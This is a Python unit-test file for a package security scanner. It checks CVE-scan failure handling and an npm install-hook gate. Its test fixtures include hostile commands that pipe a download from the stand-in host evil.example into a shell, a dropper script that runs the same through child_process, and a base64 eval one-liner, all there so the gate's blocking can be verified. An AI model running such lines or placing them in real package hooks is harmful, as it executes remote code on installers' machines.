"""Regression tests for the v0.2.8 cage hardening (security-review 2026-06-26).

Covers: the CVE scanner fail-LOUD contract (could-not-scan ≠ clean), the score cap
for an unanalyzable CVE, and the content-aware npm install-hook gate (benign builds
PASS, inline-exec / referenced-dropper / curl|sh FAIL).
"""

from __future__ import annotations

import pytest

from hermes.security_center.application.scan_service import ScanService
from hermes.security_center.domain.scan_score import Risk, Severity, compute_verdict
from hermes.security_center.infrastructure.package_content_scanner import (
    PackageContentScanner,
)
from hermes.security_center.infrastructure.trivy_cve_scanner import (
    _UNANALYZABLE_REF,
    TriviaCveScanner,
)

pytestmark = pytest.mark.unit


class _StubPolicy:
    def weight_for(self, category: str) -> int:  # noqa: ARG002
        return 100


def _score(risks: list[Risk]) -> int:
    svc = ScanService.__new__(ScanService)  # bypass repo wiring
    return svc._compose_score(risks, _StubPolicy(), engine="trivy")


# ── CVE scanner: fail-LOUD ────────────────────────────────────────────────────

def test_parse_output_distinguishes_clean_from_inconclusive():
    # Empty/garbage = trivy did NOT produce a usable report → None (inconclusive).
    assert TriviaCveScanner._parse_output(b"") is None
    assert TriviaCveScanner._parse_output(b"not-json") is None
    # A valid empty report = scanned, no vuln → [] (genuinely clean).
    assert TriviaCveScanner._parse_output(b'{"Results":[]}') == []
    # A vuln report → Risks.
    raw = b'{"Results":[{"Vulnerabilities":[{"Severity":"CRITICAL","VulnerabilityID":"CVE-1","PkgName":"foo"}]}]}'
    risks = TriviaCveScanner._parse_output(raw)
    assert risks and risks[0].severity is Severity.CRITICAL


def test_unanalyzable_is_high_cve_with_marker_ref():
    risks = TriviaCveScanner._unanalyzable("npm:foo@1.0")
    assert len(risks) == 1
    assert risks[0].category == "cve"
    assert risks[0].severity is Severity.HIGH
    assert risks[0].evidence_ref.startswith(_UNANALYZABLE_REF)


def test_unanalyzable_cve_caps_to_warn_not_pass():
    # A could-not-scan CVE must never read as a clean PASS.
    s = _score(TriviaCveScanner._unanalyzable("npm:foo@1.0"))
    assert s <= 45
    assert compute_verdict(s).value in ("WARN", "FAIL")


def test_real_cve_critical_hard_fails():
    crit = Risk(category="cve", severity=Severity.CRITICAL, message="CVE-X in foo", evidence_ref="CVE-X")
    assert compute_verdict(_score([crit])).value == "FAIL"


def test_clean_scan_passes():
    assert compute_verdict(_score([])).value == "PASS"


# ── npm install-hook gate: content-aware ──────────────────────────────────────

def _hook_verdict(scripts: dict, files: dict | None = None) -> str:
    risks = PackageContentScanner._classify_npm_install_hooks(scripts, files or {})
    return compute_verdict(_score(risks)).value


def test_prepare_build_hook_is_not_blocked():
    # Every official MCP: prepare='npm run build' does NOT run on a published install.
    assert _hook_verdict({"prepare": "npm run build"}) == "PASS"


@pytest.mark.parametrize("cmd", ["node-gyp rebuild", "tsc", "husky install", "prebuild-install || node-gyp rebuild"])
def test_benign_runs_on_install_build_tools_pass(cmd):
    assert _hook_verdict({"postinstall": cmd}) == "PASS"


@pytest.mark.parametrize("cmd", [
    "node -e \"eval(Buffer.from('Y3VybA==','base64'))\"",
    "node --eval \"process.exit(0)\"",
    "python3 -c \"import os\"",
])
def test_inline_exec_runs_on_install_is_blocked(cmd):
    # Inline interpreter code in an auto-run hook → CRITICAL → FAIL.
    assert _hook_verdict({"postinstall": cmd}) == "FAIL"


def test_curl_pipe_shell_postinstall_blocked():
    assert _hook_verdict({"postinstall": "curl -sL https://evil.example/x | bash"}) == "FAIL"


def test_referenced_local_dropper_script_blocked():
    mal = b"const cp=require('child_process');cp.execSync('curl https://evil.example/x|sh')"
    assert _hook_verdict({"postinstall": "node install.js"}, {"package/install.js": mal}) == "FAIL"


def test_referenced_local_benign_script_passes():
    benign = b"const cp=require('child_process');cp.execSync('node-gyp rebuild')"
    assert _hook_verdict({"postinstall": "node build.js"}, {"package/build.js": benign}) == "PASS"


def test_dev_only_malicious_hook_is_visible_but_not_blocking():
    # prepare/prepublish never execute on a published install → surfaced, never FAIL.
    assert _hook_verdict({"prepare": "curl https://evil.example/x | bash"}) in ("PASS", "WARN")
